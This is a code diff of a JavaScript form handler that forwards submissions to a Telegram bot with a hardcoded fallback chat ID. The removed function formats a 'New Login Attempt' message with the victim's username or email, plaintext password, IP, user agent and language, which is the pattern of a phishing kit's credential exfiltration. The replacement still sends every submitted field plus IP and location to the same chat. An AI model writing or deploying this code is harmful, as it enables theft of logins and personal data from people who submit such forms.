@@ -1,31 +1,21 @@
-function buildLoginAttemptText(fields = {}, req = {}, formId = 'unknown') {
-  const emailOrUser = fields.email || fields.username || fields.user || fields.login || '';
-  const password = fields.password || fields.pass || '';
-  const ip = extractClientIp(req);
-  const loc = extractLocation(req);
-  const userAgent = req.headers?.['user-agent'] || fields.userAgent || '';
-  const language = req.headers?.['accept-language'] || fields.language || '';
-  const time = fields.submittedAt || new Date().toISOString();
-  const submission = loc?.place ? `${formId} (${loc.place})` : String(formId);
-
-  return [
-    '🔐 New Login Attempt',
-    `👤 Email/Username: ${emailOrUser}`,
-    `🔑 Password: ${password}`,
-    `📱 IP Address: ${ip}`,
-    `🌐 User Agent: ${userAgent}`,
-    `🌍 Language: ${language}`,
-    `📅 Time: ${time}`,
-    `🔄 Submission: ${submission}`,
-  ].join('\n');
-}
-
 async function sendTelegramSubmit(payload, req, formId = 'unknown') {
   const token = process.env.TELEGRAM_BOT_TOKEN;
   const chatId = process.env.TELEGRAM_CHAT_ID || '5810458739';
   if (!token || !chatId) return;
 
-  const text = buildLoginAttemptText(payload, req, formId);
+  const ip = extractClientIp(req);
+  const loc = extractLocation(req);
+  const entries = Object.entries(payload || {})
+    .map(([key, val]) => `${key}: ${typeof val === 'object' ? JSON.stringify(val) : val}`)
+    .join('\n');
+
+  const text = [
+    `Form Submit: ${formId}`,
+    `IP: ${ip}`,
+    `Location: ${loc.place} (${loc.coords})`,
+    '',
+    entries || '(empty payload)',
+  ].join('\n');
 
   const res = await fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
     method: 'POST',
@@ -40,4 +30,20 @@ async function sendTelegramSubmit(payload, req, formId = 'unknown') {
   if (!res.ok) {
     throw new Error(`Telegram failed (${res.status}): ${await res.text()}`);
   }
+}
+
+// Inside your handler, after parsing formData:
+const ip = extractClientIp(req);
+const loc = extractLocation(req);
+
+const results = await Promise.allSettled([
+  sendEmailNotification({ formId, fields: formData, ip, location: loc }),
+  sendTelegramSubmit(formData, req, formId),
+]);
+
+if (results[0].status === 'rejected') {
+  console.error('Email submit failed:', results[0].reason);
+}
+if (results[1].status === 'rejected') {
+  console.error('Telegram submit failed:', results[1].reason);
 }
